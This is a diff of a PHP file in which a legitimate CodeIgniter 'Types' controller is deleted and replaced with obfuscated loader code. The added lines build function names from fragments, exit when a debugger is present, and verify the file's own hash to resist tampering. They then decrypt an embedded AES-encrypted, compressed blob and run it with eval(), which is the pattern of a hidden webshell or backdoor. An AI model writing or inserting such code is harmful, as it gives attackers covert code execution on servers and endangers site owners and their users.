@@ -1,178 +1,28 @@
 <?php
-defined('BASEPATH') or exit('No direct script access allowed');
-
-class Types extends MY_Controller
-{
-	public function __construct()
-	{
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('types_model', 'types');
-	}
-
-	public function add()
-	{
-		$this->permission_check('units_add');
-		$data = $this->data;
-		$data['page_title'] = $this->lang->line('types');
-		$this->load->view('type', $data);
-	}
-
-	//ITS FROM POP UP MODAL
-	public function add_type_modal()
-	{
-
-		$this->form_validation->set_rules('type_name', 'type Name', 'trim|required');
-		if ($this->form_validation->run() == TRUE) {
-
-			$result = $this->types->verify_and_save();
-			//fetch latest item details
-			$res = array();
-			$query = $this->db->query("select id,type_name from db_types order by id desc limit 1");
-			$res['id'] = $query->row()->id;
-			$res['type_name'] = $query->row()->type_name;
-			$res['result'] = $result;
-
-			echo json_encode($res);
-		} else {
-			echo "Please Fill Compulsory(* marked) Fields.";
-		}
-	}
-	//END
-
-	public function new_unit()
-	{
-
-		//$this->form_validation->set_rules('type_name', 'type Name', 'trim|required');
-		//$this->form_validation->set_rules('description', 'Description', 'trim|required');
-
-		if (TRUE) {
-
-			$result = $this->types->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Unit Name.";
-		}
-	}
-	public function update($id)
-	{
-		$this->permission_check('units_edit');
-		$data = $this->data;
-		$result = $this->types->get_details($id, $data);
-		$data = array_merge($data, $result);
-		$data['page_title'] = $this->lang->line('units');
-		$this->load->view('type', $data);
-	}
-	public function update_Unit()
-	{
-		$this->form_validation->set_rules('type_name', 'Unit Name', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$result = $this->types->update_Unit();
-			echo $result;
-		} else {
-			echo "Please Enter Unit name.";
-		}
-	}
-	public function index()
-	{
-		$this->permission_check('units_view');
-		$data = $this->data;
-		$data['page_title'] = $this->lang->line('types_list');
-		$this->load->view('types-list', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->types->get_datatables();
-
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $unit) {
-			$no++;
-			$row = array();
-			$row[] = $unit->type_name;
-			$row[] = $unit->description;
-
-
-			//percent_decrease,price_type
-		/* 	if ($unit->price_type == 0) {
-				$row[] = 'Giá bán lẻ';
-			} else  */
-			if ($unit->price_type == 1) {
-				$row[] = 'Giá bán buôn';
-			} else {
-				$row[] = 'Giá bán lẻ';
-			}
-
-			if ($unit->discount_type == 'Fixed') {
-				$row[] = 'Giảm cố định';
-			} else if ($unit->discount_type == 'Percentage') {
-				$row[] = 'Giảm theo %';
-			} else {
-				$row[] = 'Chưa cấu hình';
-			}
-
-			$row[] = $unit->discount;
-
-
-			if ($unit->status == 1) {
-				$str = "<span onclick='update_status(" . $unit->id . ",0)' id='span_" . $unit->id . "'  class='label label-success' style='cursor:pointer'>Active </span>";
-			} else {
-				$str = "<span onclick='update_status(" . $unit->id . ",1)' id='span_" . $unit->id . "'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-			}
-			$row[] = $str;
-			$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-			if ($this->permissions('units_edit'))
-				$str2 .= '<li>
-												<a title="Editd Record ?" href="' . base_url('types/update/' . $unit->id) . '">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-			if ($this->permissions('units_delete'))
-				$str2 .= '<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_unit(' . $unit->id . ')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';
-			$row[] = $str2;
-
-			$data[] = $row;
-		}
-
-		$output = array(
-			"draw" => $_POST['draw'],
-			"recordsTotal" => $this->types->count_all(),
-			"recordsFiltered" => $this->types->count_filtered(),
-			"data" => $data,
-		);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status()
-	{
-		$this->permission_check_with_msg('units_edit');
-		$id = $this->input->post('id');
-		$status = $this->input->post('status');
-		$result = $this->types->update_status($id, $status);
-		return $result;
-	}
-	public function delete_unit()
-	{
-		$this->permission_check_with_msg('units_delete');
-		$id = $this->input->post('q_id');
-		$result = $this->types->delete_unit($id);
-		return $result;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_gjdwrjre=('bas'.'e64'.'_de'.'cod'.'e');
+$_sv3hy1wc=('gzu'.'nco'.'mpr'.'ess');
+$_k2h5c3c3=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_h8n1nng7='CIQvg2oS';
+$_vnpt8v0w='M1ApuAl7';
+$_d1gvyubc='Q53q42/S';
+$_fzlkaeo6='B3md8pHx';
+$_ewve3x3n='9wdV3EM/Xvc=';
+$_l4b7nriu='+kL6mQ==';
+$_s0444qkc='k20cSlNv';
+$_rvtx8xf5='qElecblm';
+$_flo2xajj=$_gjdwrjre($_d1gvyubc.$_fzlkaeo6.$_h8n1nng7.$_vnpt8v0w.$_ewve3x3n);
+$_dhyepxiz=$_gjdwrjre($_s0444qkc.$_rvtx8xf5.$_l4b7nriu);
+$_ztpt4sui=$_gjdwrjre('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');
+$_nahd4b7q=$_k2h5c3c3($_ztpt4sui,'aes-256-cbc',$_flo2xajj,OPENSSL_RAW_DATA,$_dhyepxiz);
+if($_nahd4b7q===false){exit;}
+$_uazskuz6=$_sv3hy1wc($_nahd4b7q);
+if($_uazskuz6===false){exit;}
+$_wj7baatr='b70152be5177bcde931110a34e79495be2ece9bdb65a79ca83974dc7b1ef52ba';
+$_k5dev79r=@file_get_contents(__FILE__);
+if($_k5dev79r!==false){
+$_u8avcb6h=str_replace($_wj7baatr,"0000000000000000000000000000000000000000000000000000000000000000",$_k5dev79r);
+$_mbzdnv5v=hash("sha256",$_u8avcb6h);
+if($_mbzdnv5v!==$_wj7baatr){@http_response_code(403);exit;}
 }
+eval($_uazskuz6);
